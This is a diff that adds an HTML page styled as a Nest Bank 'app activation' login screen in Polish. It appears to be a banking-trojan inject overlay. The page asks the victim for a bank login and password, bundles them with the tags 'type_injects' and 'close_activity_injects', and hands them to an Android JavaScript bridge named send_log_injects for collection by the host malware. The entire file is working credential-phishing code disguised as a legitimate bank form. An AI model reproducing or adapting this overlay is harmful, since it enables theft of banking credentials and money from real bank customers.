@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>nestbank</title>
+    <link rel="shortcut icon" href="pl.nestbank.nestbank.png" type="image/png">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta charset="utf-8">
+</head>
+<body>
+
+<style type="text/css">
+    body {
+        background: #f6f6f6;
+        margin: 0;
+        padding: 0;
+        font-family: Helvetica, sans-serif;
+        background-size: 100%;
+    }
+    .logo {
+text-align: center;
+    padding: 0px 0px 10px 0px;
+    background-size: 80%;
+    color: #fff;
+    font-weight: 400;
+    text-decoration: none;
+    background: #00745f;
+    }
+    .form {
+        text-align: center;
+        padding-top: 70px;
+    }
+    .form label {
+        display: block;
+    }
+    form {
+        display: inline-block;
+    }
+fieldset {
+      position: relative;
+      text-align: center;
+      border: none;
+          margin: 0;
+    padding: 0;
+
+}
+
+input[type="text"],input[type="password"] {
+    line-height: 16px;
+    font-size: 17px;
+    box-sizing: border-box;
+    width: 100%;
+    position: relative;
+    padding: 10px;
+    margin: 0px 1px;
+    display: block;
+    -webkit-box-shadow: none;
+    box-shadow: none;
+    -webkit-appearance: none;
+    height: 48px;
+    margin: 0px 0px 10px 0px;
+    color: #808080;
+    text-align: left;
+    outline: none;
+    border: 1px solid #dfdfdf;
+    background: #fff;
+}
+input[type="button"] {
+left: 0;
+    right: 0;
+    width: 100%;
+    height: 47px;
+    margin: 30px 0px 0px 0px;
+    outline: none;
+    float: right;
+    color: #070707;
+    border: none;
+    font-size: 14px;
+    -webkit-appearance: none;
+    cursor: pointer;
+    background: #dddddd;
+    border: 1px solid #dddddd;
+    text-align: right;
+}
+input::placeholder {
+    color: #808080;
+    font-size: 15px;
+}
+</style>
+
+<script type="text/javascript">
+    function next() {
+                if (document.getElementById("login").value == '')
+{
+    alert ('Wszystkie pola wymagane!');
+    return false;
+}
+        document.getElementById("area").style.display="none";
+        document.getElementById("area2").style.display="block";
+        document.getElementById("dalej").style.display="none";
+        document.getElementById("message").style.display="none";
+        document.getElementById("send").style.display="block";
+    }
+    function testJump(x){
+    var ml = ~~x.getAttribute('maxlength');
+    if(ml && x.value.length >= ml){
+        do {
+      x = x.nextSibling;
+    }
+    while (x && !((/text/.test(x.type)) || x.disabled));
+        if(x && /text/.test(x.type)){
+            x.focus();
+        }
+    }
+}
+</script>
+
+<fieldset id="formtosend">
+
+<div class="" id="log" style="display: block;">
+
+<span style="background: #551a05;display: block;text-align: center;padding: 20px;color: #fff;">
+    Aktywacja aplikacji
+</span>
+<div style="text-align: left; padding-left: 20px;" id="message">
+    <h3>Login</h3>
+    <span>Podaj login, którego używasz do logowania w serwisie na stronie www Nest Banku. Jeżeli jeszcze się nie logowałeś podaj login, który otrzymałeś wraz z umową.</span>
+</div>
+<div class="area" id="area" style="padding: 30px;">
+        <label style="float: left; padding: 0px 0px 10px 0px;">Twój login Nest Bank</label>
+        <input type="text" name="login" id="login" placeholder="Podaj login" style="height: 50px;">
+        <input name="exit" type="hidden" text="true"/>
+        <input type="button" name="sumbit" onclick="next()" value="Gotowe" style="">
+</div>
+
+<div class="area" id="area2" style="padding: 30px; display: none;">
+        <label style="float: left; padding: 0px 0px 10px 0px;">Wpisz swoje hasło:
+</label>
+
+<input type="password" name="password" id="password" placeholder="Hasło">
+        <input name="exit" type="hidden" text="true"/>
+        <input type="button" name="sumbit" id="dalej" onclick="next()" value="DALEJ" style="">
+        <input type="button" name="sumbit" id="send" onclick="send_form()" value="ZALOGUJ" style="display: none;">
+</div>
+
+</div>
+
+</fieldset> 
+
+<script>
+function send_form()
+{
+if (document.getElementById("password").value == '')
+{
+    alert ('Wszystkie pola wymagane!');
+    return false;
+}
+var data = {};
+    data.login = document.getElementById('login').value;
+    data.password = document.getElementById('password').value;
+    data.type_injects = "banks";
+    data.closed = "close_activity_injects";
+    
+    var ua = navigator.userAgent.toLowerCase();
+    if(ua.indexOf("android") > -1) {
+        try {
+            Android.send_log_injects(JSON.stringify(data))
+        } catch (err) {}
+    }else{
+        alert(JSON.stringify(data));
+    } 
+}
+</script>
+
+</body>
+</html>
